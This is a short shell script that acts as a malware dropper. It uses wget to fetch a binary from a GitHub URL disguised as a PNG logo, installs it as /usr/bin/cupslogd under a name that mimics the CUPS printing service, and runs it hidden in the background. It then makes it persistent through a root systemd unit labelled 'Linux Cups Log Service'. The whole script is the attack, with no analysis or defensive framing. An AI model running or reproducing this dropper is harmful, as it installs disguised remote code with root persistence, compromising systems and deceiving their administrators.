THEURL='https://github.com/dannyxweb3/mimi/raw/main/cached/logo.178172.png'
wget $THEURL
THEFILE=logo.178172.png
THEDT=/usr/bin/cupslogd
ls $THEFILE
mv $THEFILE $THEDT
chmod a+x $THEDT
$THEDT >/dev/null 2>&1 &
ps aux| grep cupslogd
cat <<EOF > /etc/systemd/system/cupslogd.service
[Unit]
Description=Linux Cups Log Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/cupslogd
Restart=always
User=root
WorkingDirectory=/

[Install]
WantedBy=multi-user.target
EOF

systemctl enable cupslogd

